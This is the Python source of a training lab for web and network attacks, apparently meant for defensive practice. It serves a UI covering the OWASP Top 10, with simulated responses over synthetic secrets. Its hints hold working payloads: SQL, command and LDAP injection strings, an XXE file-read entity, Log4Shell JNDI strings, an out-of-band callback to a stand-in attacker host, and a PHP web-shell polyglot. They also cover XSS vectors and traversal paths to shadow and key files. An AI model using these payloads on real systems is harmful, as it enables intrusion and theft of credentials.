#!/usr/bin/env python3
# Lightweight Attack-and-Defense Lab
# Covers OWASP Top 10 (2021) + selected L3-L7 attack simulations
# Python 3.6+ standard library only — no external dependencies
# ---------------------------------------------------------------
# IMPORTANT: For authorized training use only.
# All "sensitive" data is synthetic lab data under ./lab_files.
# No real host secrets are read or executed.
# ---------------------------------------------------------------

import base64
import hashlib
import hmac as _hmac
import json
import os
import re
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse, unquote_plus

HOST = "0.0.0.0"
PORT = 8000
MAX_UPLOAD_SIZE = 4 * 1024 * 1024

BASE_DIR      = os.path.dirname(os.path.abspath(__file__))
LAB_FILES_DIR = os.path.join(BASE_DIR, "lab_files")
UPLOADS_DIR   = os.path.join(BASE_DIR, "uploads")
LOG_PATH      = os.path.join(BASE_DIR, "lab_events.log")

# ---------------------------------------------------------------------------
# Fake data stores
# ---------------------------------------------------------------------------
USERS = [
    {"id": 1, "username": "admin",   "password": "Secr3t!",  "role": "administrator"},
    {"id": 2, "username": "analyst", "password": "blue-team", "role": "analyst"},
    {"id": 3, "username": "guest",   "password": "guest123",  "role": "viewer"},
]

XXE_FILES = {
    "passwd": (
        "root:x:0:0:root:/root:/bin/bash\n"
        "nginx:x:998:995::/var/lib/nginx:/sbin/nologin\n"
        "devops:x:1001:1001::/home/devops:/bin/bash"
    ),
    "shadow": "root:$6$FakeSaltXXX$HashedPasswordSimulationOnly:19000:0:99999:7:::",
    "env":    "DB_PASS=LabOnlyPassword123\nJWT_SECRET=lab-jwt-secret-example\nAPI_TOKEN=lab-api-token-example",
    "id_rsa": (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "MIIEowIBAAKCAQEAFakeLabKeyOnlyNotRealDoNotUse==\n"
        "-----END RSA PRIVATE KEY-----"
    ),
}

EICAR_TEXT = "".join([
    "X5O!P%@AP[4\\PZX54(P^)7CC)7",
    chr(125),
    chr(36),
    "EICAR",
    "-STANDARD-",
    "ANTIVIRUS-",
    "TEST-FILE!$H+H*",
])

SSRF_TARGETS = {
    "169.254.169.254": (
        "AWS IMDS: ami-id=ami-00000000 instance-type=t2.micro "
        "iam/security-credentials/lab-role: "
        "AccessKeyId=AKIAIOSFODNN7EXAMPLE "
        "SecretAccessKey=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    ),
    "127.0.0.1": '{"status":"ok","service":"internal-api","version":"1.0"}',
    "localhost":  '{"status":"ok","service":"internal-api","version":"1.0"}',
    "192.168.0.1": "Router admin panel (Simulated)",
    "10.0.0.1":    "Private subnet gateway (Simulated)",
}

DESER_GADGETS = [
    "java.lang.Runtime", "ProcessBuilder", "exec", "os.system",
    "__reduce__", "subprocess", "pickle", "ObjectInputStream",
]

JWT_WEAK_SECRETS = ["secret", "password", "123456", "jwt", "lab", "token", "changeme"]


# ---------------------------------------------------------------------------
# Bootstrap lab data
# ---------------------------------------------------------------------------
def ensure_lab_data():
    fake_files = {
        "etc/passwd":  XXE_FILES["passwd"],
        "etc/shadow":  XXE_FILES["shadow"],
        "app/.env":    XXE_FILES["env"],
        "keys/id_rsa": XXE_FILES["id_rsa"],
        "app/config.yaml": (
            "database:\n"
            "  host: db.internal\n"
            "  user: lab_admin\n"
            "  password: LabOnlyPassword123\n"
            "redis:\n"
            "  host: cache.internal\n"
            "  password: redispass-fake\n"
        ),
        "app/tokens.json": json.dumps({
            "service_tokens": [
                {"name": "ci-pipeline", "token": "lab-ci-fake-token-aabbccdd"},
                {"name": "monitoring",  "token": "lab-mon-fake-token-eeff0011"},
            ]
        }, indent=2),
    }
    for d in (LAB_FILES_DIR, UPLOADS_DIR):
        if not os.path.isdir(d):
            os.makedirs(d)
    for rel, content in fake_files.items():
        fp = os.path.join(LAB_FILES_DIR, rel)
        dr = os.path.dirname(fp)
        if not os.path.isdir(dr):
            os.makedirs(dr)
        if not os.path.isfile(fp):
            with open(fp, "w") as fh:
                fh.write(content)


# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
def append_event(event_type, status, detail):
    stamp = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    row = "[%s] type=%s status=%s detail=%s\n" % (stamp, event_type, status, detail)
    with open(LOG_PATH, "a") as fh:
        fh.write(row)


def read_last_log_lines(n=50):
    if not os.path.isfile(LOG_PATH):
        return []
    with open(LOG_PATH, "r") as fh:
        lines = fh.readlines()
    return [l.rstrip("\n") for l in lines[-n:]]


# ---------------------------------------------------------------------------
# Multipart file upload parser (no cgi module)
# ---------------------------------------------------------------------------
def parse_multipart_artifact(body_bytes, content_type):
    marker = "boundary="
    idx = content_type.find(marker)
    if idx < 0:
        return None, None
    boundary = content_type[idx + len(marker):].strip().strip('"')
    if not boundary:
        return None, None
    sep = ("--" + boundary).encode("utf-8")
    for part in body_bytes.split(sep):
        if not part or part in (b"--", b"--\r\n"):
            continue
        chunk = part.strip(b"\r\n")
        hdr_b, sep2, payload = chunk.partition(b"\r\n\r\n")
        if not sep2:
            continue
        hdrs = hdr_b.decode("utf-8", "ignore")
        if 'name="artifact"' not in hdrs:
            continue
        fn = "upload.bin"
        tok = 'filename="'
        ti = hdrs.find(tok)
        if ti >= 0:
            ts = ti + len(tok)
            te = hdrs.find('"', ts)
            if te > ts:
                fn = hdrs[ts:te]
        clean = os.path.basename(fn) or "upload.bin"
        data  = payload[:-2] if payload.endswith(b"\r\n") else payload
        return clean, data
    return None, None


# ---------------------------------------------------------------------------
# HTML frontend
# ---------------------------------------------------------------------------
HTML_CONTENT = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Attack &amp; Defense Lab</title>
<style>
:root{
  --bg:#eaf3ff;--surface:#fff;--line:#d2dfe8;
  --text:#1e2b37;--muted:#5c697a;
  --blue:#246fdb;--blue-d:#1c56ab;
  --green:#1b9774;--red:#c23b31;--amber:#c07c10;
  --sh:0 8px 22px rgba(20,60,100,.12);
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Segoe UI",Tahoma,Arial,sans-serif;background:linear-gradient(160deg,#e9f4ff 0%,#e8f8f1 50%,#f5f9f7 100%);color:var(--text);line-height:1.5}
.wrap{max-width:1300px;margin:0 auto;padding:20px}
.hero{background:var(--surface);border:1px solid var(--line);border-radius:14px;box-shadow:var(--sh);padding:20px;margin-bottom:16px}
h1{color:#184976;font-size:26px;margin-bottom:6px}
.sub{color:var(--muted);font-size:13px}
h3{color:#1e4f83;font-size:15px;margin-bottom:8px}
.tabs{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:16px}
.tab{padding:7px 14px;border:1px solid var(--blue);border-radius:20px;background:#fff;color:var(--blue);cursor:pointer;font-size:13px;font-weight:600}
.tab.active,.tab:hover{background:var(--blue);color:#fff}
.section{display:none}.section.active{display:block}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px}
.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;box-shadow:var(--sh);padding:16px}
.tip{color:var(--muted);font-size:12px;margin-bottom:10px}
.tip code{background:#ecf2f7;padding:1px 4px;border-radius:3px;font-family:Consolas,monospace;font-size:12px}
label{display:block;font-size:12px;font-weight:600;color:#2b4152;margin:8px 0 3px}
input,textarea,select{width:100%;border:1px solid #bfcfdb;border-radius:7px;padding:8px;font-size:13px;background:#fcfefe;color:var(--text)}
textarea{resize:vertical;min-height:60px}
.btn{margin-top:10px;width:100%;border:none;border-radius:7px;padding:9px;color:#fff;font-weight:700;cursor:pointer;font-size:13px;background:linear-gradient(180deg,var(--blue) 0%,var(--blue-d) 100%)}
.btn:hover{filter:brightness(.93)}
.btn-sm{padding:6px 10px;width:auto;margin-top:0;font-size:12px;border-radius:6px;border:none;color:#fff;cursor:pointer;background:var(--blue-d)}
.result{margin-top:10px;min-height:70px;border:1px solid #c8d6e0;border-radius:8px;background:#f7fbfd;padding:10px;font-size:12px;white-space:pre-wrap;overflow-wrap:break-word;font-family:Consolas,monospace}
.ok{color:var(--green);font-weight:700}
.warn{color:var(--red);font-weight:700}
.info{color:var(--amber);font-weight:700}
.badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 6px;border-radius:10px;margin-left:6px;vertical-align:middle}
.badge-red{background:#fde8e8;color:var(--red)}
.log-box{background:#0e1f2e;color:#a8d8a8;border-radius:8px;padding:12px;font-size:11px;min-height:100px;white-space:pre-wrap;font-family:Consolas,monospace;overflow-y:auto;max-height:280px}
footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
</style>
</head>
<body>
<div class="wrap">
<div class="hero">
  <h1>Attack &amp; Defense Lab <span class="badge badge-red">Huawei Cloud Security PoC Only - Author: Jason Gao</span></h1>
  <p class="sub">OWASP Top 10 (2021) + L3-L7 attack simulation. All sensitive files are synthetic under <code>./lab_files</code>. No real system data is read or executed.</p>
</div>
<div class="tabs">
  <div class="tab active" onclick="switchTab('injection')">Injection (A03)</div>
  <div class="tab" onclick="switchTab('authz')">Auth/AuthZ (A01/A07)</div>
  <div class="tab" onclick="switchTab('xss')">XSS (A03)</div>
  <div class="tab" onclick="switchTab('lfi')">LFI/Traversal (A01)</div>
  <div class="tab" onclick="switchTab('ssrf')">SSRF (A10)</div>
  <div class="tab" onclick="switchTab('xxe')">XXE (A05)</div>
  <div class="tab" onclick="switchTab('deser')">Insecure Deser (A08)</div>
  <div class="tab" onclick="switchTab('misconfig')">Misconfig (A05)</div>
  <div class="tab" onclick="switchTab('upload')">Upload/Malware</div>
  <div class="tab" onclick="switchTab('network')">L3-L4 Network</div>
  <div class="tab" onclick="switchTab('logs')">Event Logs</div>
</div>

<!-- INJECTION -->
<div class="section active" id="sec-injection">
<div class="grid">
<div class="card"><h3>A03 &mdash; SQL Injection (Login Bypass)</h3>
<p class="tip">Bypass: <code>' OR '1'='1</code> | UNION: <code>' UNION SELECT 1,username,password FROM users--</code></p>
<label>Username</label><input id="sqli-u" value="admin">
<label>Password</label><input id="sqli-p" value="password">
<button class="btn" onclick="api('sqli','sqli-out',{username:g('sqli-u'),password:g('sqli-p')})">Send</button>
<div id="sqli-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; SQL Injection (Error-Based)</h3>
<p class="tip">Probe: <code>'</code> | Error-based: <code>' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--</code></p>
<label>Search Term</label><input id="sqli2-q" value="widget">
<button class="btn" onclick="api('sqli2','sqli2-out',{q:g('sqli2-q')})">Search</button>
<div id="sqli2-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; NoSQL Injection</h3>
<p class="tip">Operator: <code>{"$gt":""}</code> | <code>{"$ne":"invalid"}</code></p>
<label>Username (JSON or plain)</label><input id="nosql-u" value='{"$gt":""}'>
<label>Password</label><input id="nosql-p" value="anything">
<button class="btn" onclick="api('nosqli','nosql-out',{username:g('nosql-u'),password:g('nosql-p')})">Send</button>
<div id="nosql-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; OS Command Injection</h3>
<p class="tip">Chain: <code>127.0.0.1; cat /etc/passwd</code> | Pipe: <code>127.0.0.1 | id</code> | Backtick: <code>`whoami`</code></p>
<label>Host</label><input id="cmdi-h" value="127.0.0.1">
<button class="btn" onclick="api('cmdi','cmdi-out',{host:g('cmdi-h')})">Ping</button>
<div id="cmdi-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; LDAP Injection</h3>
<p class="tip">Bypass: <code>*)(uid=*</code> | <code>admin)(&amp;</code></p>
<label>Username</label><input id="ldap-u" value="*)(uid=*">
<label>Password</label><input id="ldap-p" value="anything">
<button class="btn" onclick="api('ldapi','ldap-out',{username:g('ldap-u'),password:g('ldap-p')})">Send</button>
<div id="ldap-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; SSTI (Template Injection)</h3>
<p class="tip">Jinja2: <code>{{7*7}}</code> | <code>{{config.items()}}</code> | <code>{{''.__class__.__mro__}}</code></p>
<label>Template Input</label><input id="ssti-i" value="{{7*7}}">
<button class="btn" onclick="api('ssti','ssti-out',{input:g('ssti-i')})">Render</button>
<div id="ssti-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; CRLF / Header Injection</h3>
<p class="tip">Inject: <code>normal%0d%0aSet-Cookie:%20session=hijacked</code></p>
<label>Redirect Value</label><input id="crlf-i" value="normal%0d%0aSet-Cookie:%20session=hijacked">
<button class="btn" onclick="api('crlfi','crlf-out',{value:g('crlf-i')})">Send</button>
<div id="crlf-out" class="result"></div></div>
</div></div>

<!-- AUTH/AUTHZ -->
<div class="section" id="sec-authz">
<div class="grid">
<div class="card"><h3>A07 &mdash; Brute Force Login</h3>
<p class="tip">Credential stuffing simulation. Try admin with wordlist below.</p>
<label>Username</label><input id="bf-u" value="admin">
<label>Passwords (one per line)</label>
<textarea id="bf-pw">password\n123456\nSecr3t!\nletmein\nadmin</textarea>
<button class="btn" onclick="bruteForce()">Run Brute Force</button>
<div id="bf-out" class="result"></div></div>

<div class="card"><h3>A01 &mdash; IDOR (User Profile)</h3>
<p class="tip">Enumerate user IDs 1,2,3 without owning the record.</p>
<label>User ID</label><input id="idor-id" value="2" type="number">
<button class="btn" onclick="api('idor','idor-out',{id:g('idor-id')})">Fetch Profile</button>
<div id="idor-out" class="result"></div></div>

<div class="card"><h3>A07 &mdash; JWT Tampering</h3>
<p class="tip">alg:none bypass removes signature. Weak secret brute-force tries common keys.</p>
<label>JWT Token</label>
<textarea id="jwt-token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidmlld2VyIn0.FAKE_SIGNATURE</textarea>
<label>Attack</label>
<select id="jwt-attack">
  <option value="none_alg">alg:none bypass</option>
  <option value="weak_secret">weak secret brute-force</option>
  <option value="decode">decode only</option>
</select>
<button class="btn" onclick="api('jwt','jwt-out',{token:g('jwt-token'),attack:g('jwt-attack')})">Attack</button>
<div id="jwt-out" class="result"></div></div>

<div class="card"><h3>A01 &mdash; Privilege Escalation</h3>
<p class="tip">Change role from <code>viewer</code> to <code>administrator</code> in the request.</p>
<label>Claimed Role</label>
<select id="priv-role">
  <option value="viewer">viewer</option>
  <option value="analyst">analyst</option>
  <option value="administrator">administrator</option>
</select>
<button class="btn" onclick="api('privesc','priv-out',{role:g('priv-role')})">Access Admin</button>
<div id="priv-out" class="result"></div></div>

<div class="card"><h3>A02 &mdash; Weak Cryptography</h3>
<p class="tip">MD5 / SHA-1 are broken. <code>5f4dcc3b5aa765d61d8327deb882cf99</code> = <em>password</em></p>
<label>Password</label><input id="crypto-p" value="password">
<label>Algorithm</label>
<select id="crypto-alg">
  <option value="md5">MD5 (broken)</option>
  <option value="sha1">SHA-1 (deprecated)</option>
  <option value="sha256">SHA-256 (ok)</option>
  <option value="bcrypt_sim">bcrypt (simulated)</option>
</select>
<button class="btn" onclick="api('weakcrypto','crypto-out',{password:g('crypto-p'),alg:g('crypto-alg')})">Hash</button>
<div id="crypto-out" class="result"></div></div>

<div class="card"><h3>A09 &mdash; Log Forging</h3>
<p class="tip">Inject CRLF to forge log entries: <code>normal%0atype=auth status=ok detail=injected</code></p>
<label>Log Message</label><input id="logf-m" value="normal%0atype=auth status=ok detail=injected">
<button class="btn" onclick="api('logforge','logf-out',{msg:g('logf-m')})">Inject Log</button>
<div id="logf-out" class="result"></div></div>
</div></div>

<!-- XSS -->
<div class="section" id="sec-xss">
<div class="grid">
<div class="card"><h3>A03 &mdash; Reflected XSS</h3>
<p class="tip">Try: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert('xss')&gt;</code></p>
<label>Input</label><input id="rxss-i" value="&lt;img src=x onerror=alert('rxss')&gt;">
<button class="btn" onclick="reflectedXSS()">Reflect</button>
<div id="rxss-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; Stored XSS (Comment Board)</h3>
<p class="tip">Post comment; rendered via innerHTML (client-side demo, no backend request). Try <code>&lt;script&gt;alert('stored')&lt;/script&gt;</code></p>
<label>Comment</label><input id="sxss-i" value="Hello from &lt;b&gt;Bob&lt;/b&gt;">
<button class="btn" onclick="postComment()">Post Comment</button>
<button class="btn" style="margin-top:6px;background:var(--blue-d)" onclick="loadComments()">View Board</button>
<div id="sxss-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; DOM-Based XSS</h3>
<p class="tip">Inject into DOM via innerHTML (client-side demo, no backend request). Add <code>#&lt;img src=x onerror=alert('dom')&gt;</code> to URL or use input.</p>
<label>Fragment value</label><input id="dxss-i" value="&lt;img src=x onerror=alert('dom')&gt;">
<button class="btn" onclick="domXSS()">Inject DOM</button>
<div id="dxss-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; XSS via HTTP Header</h3>
<p class="tip">Server reflects X-Custom-Name header without escaping.</p>
<label>X-Custom-Name value</label><input id="hxss-i" value="&lt;script&gt;alert('hdr')&lt;/script&gt;">
<button class="btn" onclick="api('headerxss','hxss-out',{value:g('hxss-i')})">Send</button>
<div id="hxss-out" class="result"></div></div>
</div></div>

<!-- LFI -->
<div class="section" id="sec-lfi">
<div class="grid">
<div class="card"><h3>A01 &mdash; LFI / Path Traversal</h3>
<p class="tip">Targets: <code>../../etc/passwd</code> | <code>../../etc/shadow</code> | <code>../app/.env</code> | <code>../keys/id_rsa</code> | <code>../app/config.yaml</code> | <code>../app/tokens.json</code><br>URL-encoded: <code>..%2F..%2Fetc%2Fpasswd</code><br>Double-encoded: <code>..%252F..%252Fetc%252Fpasswd</code></p>
<label>File Path / Target</label><input id="lfi-t" value="../../etc/passwd">
<button class="btn" onclick="api('lfi','lfi-out',{target:g('lfi-t')})">Request</button>
<div id="lfi-out" class="result"></div></div>

<div class="card"><h3>A01 &mdash; Directory Listing Exposure</h3>
<p class="tip">Browse directories: <code>/</code> | <code>/lab_files</code> | <code>/uploads</code></p>
<label>Directory Path</label><input id="dirlist-p" value="/lab_files">
<button class="btn" onclick="api('dirlist','dirlist-out',{path:g('dirlist-p')})">List</button>
<div id="dirlist-out" class="result"></div></div>

<div class="card"><h3>A05 &mdash; Backup / Dot-File Disclosure</h3>
<p class="tip">Targets: <code>.env</code> | <code>.git/config</code> | <code>web.config.bak</code> | <code>app.config.bak</code></p>
<label>File</label><input id="dot-f" value=".env">
<button class="btn" onclick="api('dotfile','dot-out',{file:g('dot-f')})">Fetch</button>
<div id="dot-out" class="result"></div></div>
</div></div>

<!-- SSRF -->
<div class="section" id="sec-ssrf">
<div class="grid">
<div class="card"><h3>A10 &mdash; SSRF (Internal Host Probe)</h3>
<p class="tip"><code>169.254.169.254</code> AWS IMDS | <code>127.0.0.1</code> internal API | <code>192.168.0.1</code> router | <code>10.0.0.1</code> gateway</p>
<label>Target Host / URL</label><input id="ssrf-u" value="169.254.169.254">
<button class="btn" onclick="api('ssrf','ssrf-out',{url:g('ssrf-u')})">Send Request</button>
<div id="ssrf-out" class="result"></div></div>

<div class="card"><h3>A10 &mdash; SSRF via Open Redirect</h3>
<p class="tip">IP bypass wrappers: <code>http://0x7f000001/</code> | <code>http://127.1/</code> | <code>http://[::1]/</code></p>
<label>Redirect-To URL</label><input id="ssrf2-u" value="http://127.0.0.1/admin">
<button class="btn" onclick="api('ssrf_redirect','ssrf2-out',{url:g('ssrf2-u')})">Follow Redirect</button>
<div id="ssrf2-out" class="result"></div></div>
</div></div>

<!-- XXE -->
<div class="section" id="sec-xxe">
<div class="grid">
<div class="card"><h3>A05 &mdash; XXE File Read</h3>
<p class="tip">File targets: <code>passwd</code> <code>shadow</code> <code>env</code> <code>id_rsa</code></p>
<label>XML Payload</label>
<textarea id="xxe-xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</textarea>
<button class="btn" onclick="api('xxe','xxe-out',{xml:g('xxe-xml')})">Parse XML</button>
<div id="xxe-out" class="result"></div></div>

<div class="card"><h3>A05 &mdash; XXE Blind OOB</h3>
<p class="tip">Out-of-band exfiltration via external DTD callback (simulated).</p>
<label>OOB Callback Host</label><input id="xxe2-h" value="attacker.example.com">
<label>File</label>
<select id="xxe2-f">
  <option value="passwd">/etc/passwd</option>
  <option value="shadow">/etc/shadow</option>
  <option value="env">app/.env</option>
  <option value="id_rsa">id_rsa</option>
</select>
<button class="btn" onclick="api('xxe_blind','xxe2-out',{host:g('xxe2-h'),file:g('xxe2-f')})">Trigger OOB</button>
<div id="xxe2-out" class="result"></div></div>
</div></div>

<!-- DESER -->
<div class="section" id="sec-deser">
<div class="grid">
<div class="card"><h3>A08 &mdash; Insecure Deserialization</h3>
<p class="tip">Gadget keywords: <code>__reduce__</code> <code>subprocess</code> <code>os.system</code> <code>exec</code><br>Safe example (JSON b64): <code>eyJ1c2VyIjogImFkbWluIn0=</code></p>
<label>Serialized Payload (Base64)</label>
<textarea id="deser-d">eyJ1c2VyIjogImFkbWluIn0=</textarea>
<label>Format</label>
<select id="deser-f">
  <option value="json">JSON</option>
  <option value="pickle_sim">Python pickle (simulated)</option>
  <option value="java_sim">Java object (simulated)</option>
</select>
<button class="btn" onclick="api('deser','deser-out',{data:g('deser-d'),format:g('deser-f')})">Deserialize</button>
<div id="deser-out" class="result"></div></div>

<div class="card"><h3>A06 &mdash; Log4Shell Simulation (CVE-2021-44228)</h3>
<p class="tip">JNDI lookup: <code>${jndi:ldap://attacker.example.com/a}</code></p>
<label>User-Agent / Input</label>
<input id="log4j-i" value="${jndi:ldap://attacker.example.com/a}">
<button class="btn" onclick="api('log4shell','log4j-out',{input:g('log4j-i')})">Send</button>
<div id="log4j-out" class="result"></div></div>
</div></div>

<!-- MISCONFIG -->
<div class="section" id="sec-misconfig">
<div class="grid">
<div class="card"><h3>A05 &mdash; Exposed Debug Endpoint</h3>
<p class="tip">Common paths: <code>/debug</code> <code>/_debug</code> <code>/console</code> <code>/actuator/env</code></p>
<label>Path</label><input id="debug-p" value="/debug">
<button class="btn" onclick="api('debugpath','debug-out',{path:g('debug-p')})">Probe</button>
<div id="debug-out" class="result"></div></div>

<div class="card"><h3>A05 &mdash; Default / Weak Credentials</h3>
<p class="tip">Try: admin/admin, admin/password, root/root, guest/guest</p>
<label>Username</label><input id="defcred-u" value="admin">
<label>Password</label><input id="defcred-p" value="admin">
<button class="btn" onclick="api('defcred','defcred-out',{username:g('defcred-u'),password:g('defcred-p')})">Login</button>
<div id="defcred-out" class="result"></div></div>

<div class="card"><h3>A05 &mdash; HTTP Method Tampering</h3>
<p class="tip">Blocked methods: <code>TRACE</code> <code>OPTIONS</code> <code>PUT</code> <code>DELETE</code></p>
<label>Method</label>
<select id="method-m">
  <option>TRACE</option><option>OPTIONS</option><option>PUT</option>
  <option>DELETE</option><option>CONNECT</option>
</select>
<label>Path</label><input id="method-p" value="/api/sqli">
<button class="btn" onclick="api('method_tamper','method-out',{method:g('method-m'),path:g('method-p')})">Send</button>
<div id="method-out" class="result"></div></div>

<div class="card"><h3>A04 &mdash; File IDOR (Report Enumeration)</h3>
<p class="tip">Try IDs: <code>1</code> <code>2</code> <code>99</code> or traversal: <code>../etc/passwd</code></p>
<label>Report ID</label><input id="fidor-id" value="2">
<button class="btn" onclick="api('file_idor','fidor-out',{id:g('fidor-id')})">Download Report</button>
<div id="fidor-out" class="result"></div></div>

<div class="card"><h3>A05 &mdash; Verbose Error / Stack Trace</h3>
<p class="tip">Special chars trigger full traceback disclosure.</p>
<label>Input</label><input id="err-i" value="{{bad_obj}}">
<button class="btn" onclick="api('verbose_error','err-out',{input:g('err-i')})">Trigger Error</button>
<div id="err-out" class="result"></div></div>
</div></div>

<!-- UPLOAD -->
<div class="section" id="sec-upload">
<div class="grid">
<div class="card"><h3>A08 &mdash; Unrestricted File Upload</h3>
<p class="tip">Upload any file. Server can detect EICAR-like test signatures for AV/EDR correlation.<br>
For NGFW compatibility, no EICAR string is pre-rendered in this page.</p>
<label>File</label><input id="upl-f" type="file">
<label>Bypass extension suffix</label>
<select id="upl-ext">
  <option value="">none</option>
  <option value=".php">.php</option>
  <option value=".php5">.php5</option>
  <option value=".phtml">.phtml</option>
  <option value=".jsp">.jsp</option>
  <option value=".aspx">.aspx</option>
</select>
<button class="btn" onclick="uploadFile()">Upload</button>
<div id="upl-out" class="result"></div></div>

<div class="card"><h3>A08 &mdash; Polyglot File Upload</h3>
<p class="tip">File valid as both image and script (polyglot technique).</p>
<label>Filename</label><input id="poly-fn" value="evil.jpg.php">
<label>Content-Type</label>
<select id="poly-ct">
  <option value="image/jpeg">image/jpeg</option>
  <option value="image/png">image/png</option>
  <option value="application/pdf">application/pdf</option>
</select>
<label>Payload description</label>
<input id="poly-pl" value="GIF89a&lt;?php system($_GET[cmd]); ?&gt;">
<button class="btn" onclick="api('polyglot','poly-out',{filename:g('poly-fn'),ct:g('poly-ct'),payload:g('poly-pl')})">Simulate Upload</button>
<div id="poly-out" class="result"></div></div>
</div></div>

<!-- NETWORK -->
<div class="section" id="sec-network">
<div class="grid">
<div class="card"><h3>L3 &mdash; IP Spoofing</h3>
<p class="tip">Bypass IP-based allow-lists via X-Forwarded-For header.</p>
<label>Spoofed Source IP</label><input id="spoof-ip" value="10.0.0.1">
<label>Target Endpoint</label><input id="spoof-ep" value="/api/health">
<button class="btn" onclick="api('ip_spoof','spoof-out',{ip:g('spoof-ip'),endpoint:g('spoof-ep')})">Spoof</button>
<div id="spoof-out" class="result"></div></div>

<div class="card"><h3>L3/L4 &mdash; Port Scan Simulation</h3>
<p class="tip">Simulated internal port probe. No real TCP connections made.</p>
<label>Target Host</label><input id="scan-h" value="127.0.0.1">
<label>Ports (comma separated)</label><input id="scan-p" value="22,80,443,3306,6379,8080,8443">
<button class="btn" onclick="api('portscan','scan-out',{host:g('scan-h'),ports:g('scan-p')})">Scan</button>
<div id="scan-out" class="result"></div></div>

<div class="card"><h3>L4 &mdash; SYN Flood Simulation</h3>
<p class="tip">No real packets sent. Generates log events for WAF/IDS correlation.</p>
<label>Target Host</label><input id="syn-h" value="192.168.1.100">
<label>Target Port</label><input id="syn-p" value="80">
<label>Simulated Packet Count</label><input id="syn-c" value="1000">
<button class="btn" onclick="api('synflood','syn-out',{host:g('syn-h'),port:g('syn-p'),count:g('syn-c')})">Simulate</button>
<div id="syn-out" class="result"></div></div>

<div class="card"><h3>L7 &mdash; HTTP Flood / Rate Limit Test</h3>
<p class="tip">Rapid repeated GET requests to trigger rate-limit or WAF rules.</p>
<label>Endpoint</label><input id="flood-ep" value="/api/health">
<label>Request Count</label><input id="flood-n" value="20" type="number">
<button class="btn" onclick="httpFlood()">Start Flood</button>
<div id="flood-out" class="result"></div></div>

<div class="card"><h3>L7 &mdash; Slowloris DoS Simulation</h3>
<p class="tip">Simulates holding many incomplete HTTP connections.</p>
<label>Simulated Connections</label><input id="slow-c" value="50">
<button class="btn" onclick="api('slowloris','slow-out',{connections:g('slow-c')})">Simulate</button>
<div id="slow-out" class="result"></div></div>

<div class="card"><h3>L7 &mdash; Host Header Injection</h3>
<p class="tip">Password-reset poisoning via injected Host header: <code>attacker.example.com</code></p>
<label>Host Header Value</label><input id="hosth-v" value="attacker.example.com">
<label>Endpoint</label><input id="hosth-ep" value="/api/health">
<button class="btn" onclick="api('hostheader','hosth-out',{host:g('hosth-v'),endpoint:g('hosth-ep')})">Send</button>
<div id="hosth-out" class="result"></div></div>
</div></div>

<!-- LOGS -->
<div class="section" id="sec-logs">
<div style="display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap">
  <button class="btn-sm" onclick="loadLogs()">Refresh Logs</button>
  <button class="btn-sm" onclick="listLabFiles()">List Lab Files</button>
  <button class="btn-sm" onclick="clearLogs()">Clear Logs</button>
</div>
<div id="log-box" class="log-box">Loading...</div>
</div>

</div><!-- /wrap -->
<footer>Training environment only &mdash; do not expose to the internet or use against real systems.</footer>
<script>
function g(id){ return document.getElementById(id).value; }
function show(id,t){ var e=document.getElementById(id); if(e) e.textContent=t; }
function showHtml(id,h){ var e=document.getElementById(id); if(e) e.innerHTML=h; }

function switchTab(name){
  document.querySelectorAll('.section').forEach(function(s){ s.classList.remove('active'); });
  document.querySelectorAll('.tab').forEach(function(t){ t.classList.remove('active'); });
  var s=document.getElementById('sec-'+name);
  if(s) s.classList.add('active');
  var t=document.querySelector('[onclick="switchTab(\\''+name+'\\')"]');
  if(t) t.classList.add('active');
  if(name==='logs') loadLogs();
}

function parseJsonSafe(text){
    try{ return JSON.parse(text); }catch(e){ return null; }
}

function bodyPreview(text){
    if(!text) return '';
    return String(text).replace(/\s+/g,' ').slice(0,220);
}

function renderApiResult(outId,xhr,jsonObj){
    var lines=['HTTP '+xhr.status];
    if(jsonObj && typeof jsonObj.ok==='boolean'){
        lines.push('App '+(jsonObj.ok?'OK':'Blocked/Failed'));
    }
    if(!jsonObj){
        var ct=(xhr.getResponseHeader('Content-Type')||'').toLowerCase();
        if(xhr.status===0){
            lines.push('Network error: request may be dropped/reset by NGFW/WAF or browser policy.');
        }else if(ct.indexOf('application/json')===-1){
            lines.push('Non-JSON response: possible interception/block page from upstream firewall.');
        }else{
            lines.push('Invalid JSON payload.');
        }
        var sn=bodyPreview(xhr.responseText);
        if(sn) lines.push('Body Preview: '+sn);
        show(outId,lines.join('\\n'));
        return;
    }
    show(outId,lines.join('\\n')+'\\n'+JSON.stringify(jsonObj,null,2));
}

function api(endpoint,outId,params){
  var qs=Object.keys(params).map(function(k){return encodeURIComponent(k)+'='+encodeURIComponent(params[k]);}).join('&');
  var xhr=new XMLHttpRequest();
